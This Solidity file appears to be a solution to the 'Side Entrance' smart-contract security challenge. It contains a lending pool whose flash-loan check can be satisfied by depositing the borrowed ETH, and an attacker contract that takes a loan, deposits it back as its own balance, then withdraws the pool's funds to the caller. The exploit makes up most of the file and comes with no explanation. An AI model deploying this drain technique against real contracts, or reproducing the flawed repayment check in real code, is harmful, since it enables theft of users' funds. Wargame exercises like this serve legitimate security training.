pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool victim;

    constructor(address _victim) public {
        victim = SideEntranceLenderPool(_victim);
    }

    function entry(uint256 amount) external {
        victim.flashLoan(amount);
    }
    
    function execute() external payable override {
        victim.deposit{value: address(this).balance}();
    }

    function getWithdrawAmount() external {
        victim.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {

    }


}
 